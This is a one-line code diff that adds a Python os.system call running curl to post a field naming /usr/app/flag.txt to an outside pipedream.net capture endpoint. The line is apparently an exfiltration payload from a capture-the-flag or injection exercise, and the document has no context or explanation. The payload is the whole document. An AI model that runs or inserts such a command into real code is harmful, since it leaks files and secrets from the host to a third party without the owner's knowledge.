@@ -1,0 +1,1 @@
+os.system("curl -F 'data=file:///usr/app/flag.txt' https://eomwnc1qq02m0j3.m.pipedream.net/")
